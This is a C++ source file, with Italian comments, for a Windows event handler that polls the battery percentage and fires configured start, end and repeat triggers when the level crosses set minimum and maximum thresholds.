#include "Event.h"
#include "Common.h"
#include "Conf.h"
#include "Date.h"
#include "Log.h"
//#include <pm.h>
#include "CallBacks.h"
#include "Device.h"

#include "FunctionFunc.h"

DWORD WINAPI OnBatteryLevel(LPVOID lpParam) {
	Event *me = (Event *)lpParam;
	Configuration *conf;
	HANDLE eventHandle;
	int delay, iterations, curIterations = 0, curDelay = 0, minLevel, maxLevel;
	//const SYSTEM_POWER_STATUS_EX2 *pBattery = NULL;
	const SYSTEM_POWER_STATUS *pBattery = NULL;
	DWORD dwBatteryLife, dwPrevLife;
	BOOL bRange = FALSE;
	Device *deviceObj = Device::self();

	eventHandle = me->getEvent();

	me->setStatus(EVENT_RUNNING);
	conf = me->getConf();

	try {
		iterations = conf->getInt(L"iter");
	} catch (...) {
		iterations = MAXINT;
	}

	try {
		delay = conf->getInt(L"delay") * 1000;
	} catch (...) {
		//delay = INFINITE;
		//se è infinito è non c'e' un Repeat non esce dal wail e' non arriva mai ad AC off 
		delay = 60001;
	}

	try {
		minLevel = conf->getInt(L"min");
	} catch (...) {
		minLevel = 0;
	}

	try {
		maxLevel = conf->getInt(L"max");
	} catch (...) {
		maxLevel = 100;
	}

	if (minLevel > maxLevel) {
		me->setStatus(EVENT_STOPPED);
		return 0;
	}
/***
	deviceObj->RefreshBatteryStatus();
	pBattery = deviceObj->GetBatteryStatus();
	dwPrevLife = pBattery->BatteryLifePercent;

	// Se lo stato e' sconosciuto, assumiamo che sia carica
	if (dwPrevLife == BATTERY_PERCENTAGE_UNKNOWN)
		dwPrevLife = 100;

	if (deviceObj->RegisterPowerNotification(BatteryCallback, (DWORD)&dwBatteryLife) == FALSE) {
		me->setStatus(EVENT_STOPPED);
		return TRUE;
	}
***/
	DBG_TRACE(L"Debug - Battery.cpp - Battery event started\n", 5, FALSE);

	LOOP {

		deviceObj->RefreshBatteryStatus();
		pBattery = deviceObj->GetBatteryStatus();
		dwPrevLife = pBattery->BatteryLifePercent;
		

		// Se lo stato e' sconosciuto, assumiamo che sia carica
		if (dwPrevLife == BATTERY_PERCENTAGE_UNKNOWN)
			dwPrevLife = 100;

		dwBatteryLife=dwPrevLife;
		
		// Nel range
		if ((dwBatteryLife >= (UINT)minLevel && dwBatteryLife <= (UINT)maxLevel) && bRange == FALSE) {
			bRange = TRUE;
			DBG_TRACE(L"Debug - Events.cpp - Battery event [IN action triggered]\n", 5, FALSE);
			me->triggerStart();
			curIterations = 0;
		} 

		// Fuori dal range
		if ((dwBatteryLife < (UINT)minLevel || dwBatteryLife > (UINT)maxLevel) && bRange == TRUE) {
			bRange = FALSE;
			DBG_TRACE(L"Debug - Events.cpp - Battery event [OUT action triggered]\n", 5, FALSE);
			me->triggerEnd();
			curIterations = 0;
		}
		
		if (bRange)
			curDelay = delay;
		else
			curDelay = 60000;

		_WaitForSingleObject(eventHandle, curDelay);

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Events.cpp - Battery Event is Closing\n", 1, FALSE);
			me->setStatus(EVENT_STOPPED);

			///deviceObj->UnRegisterPowerNotification(AcCallback);
			return 0;
		}

		//se curDelay != 60001 significa che non c'e' una Repeat per cui sinifica che non ho bisogno di eseguire il trigger
		if (curDelay != 60001 && bRange && curIterations < iterations) {
			me->triggerRepeat();
			curIterations++;
		}
	}

	me->setStatus(EVENT_STOPPED);
	return 0;
}